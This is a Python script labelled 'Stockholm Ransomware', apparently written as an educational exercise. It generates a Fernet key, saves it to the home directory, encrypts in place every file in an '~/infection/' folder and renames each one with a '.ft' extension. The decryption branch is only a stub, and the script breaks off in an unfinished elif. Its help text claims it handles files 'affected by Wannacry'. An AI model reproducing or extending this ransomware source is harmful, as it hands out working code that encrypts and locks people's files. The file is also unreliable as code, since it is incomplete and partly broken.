import os
import argparse
from cryptography.fernet import Fernet
from getpass import getuser
from time import sleep

user = getuser()
user_dir = '/home/' + user
default_dir = '/home/' + user + '/infection/'

# Adding all the files in scanned_files list
scanned_files = []

# Flags
parser = argparse.ArgumentParser(
    description="""
    *** STOCKHOLM RANSOMWARE ***
    
    Encrypt and decrypt all files and subdirectories affected by Wannacry.
    It also changes extension of each file.
    *** WARNING: This program was written for educational purposes.
    The responsibility for the use and distribution of the tool lies with the user.
    Use it at your own risk and enjoy! - salecler """
    )
# Version
parser.add_argument('-v', '--version', action='store_true', help='Show version of the program.')
# Reverse
parser.add_argument('-r', '--reverse', action='store_true', help="Decrypt all the files and subdirectories. Also change back the file's extension.")
# Silent
parser.add_argument('-s', '--silent', action='store_true', help='Will silent the program.')

args = parser.parse_args()
if args.version == True and args.reverse == True:
    err = "You are not allowed to use both flags at the same time."
    print(err)
    exit
elif args.version == True:
    os.system("clear")
    #print(lil_stockholm)
    #print("Version 1.1 - ", salecler)
elif args.reverse == True:
    print("reversing...")
    #text_reverse()

# Encrypt the files
elif args.reverse == False and args.version == False:
        # Create the key
    os.chdir(user_dir)
    key = Fernet.generate_key()
    with open("key", "wb") as thekey:
        thekey.write(key)
    os.chdir(default_dir)
    for element in os.listdir(default_dir):
        actual_dir = os.getcwd()
        if args.silent == False:
            print(element)
        with open(element, "rb") as thefile:
            content = thefile.read()
        encrypted_content = Fernet(key).encrypt(content)
        with open(element, "wb") as thenewfile:
            thenewfile.write(encrypted_content)
    for archive in os.listdir(default_dir):
        os.rename(archive, archive + '.ft')
        
elif args.reverse == True: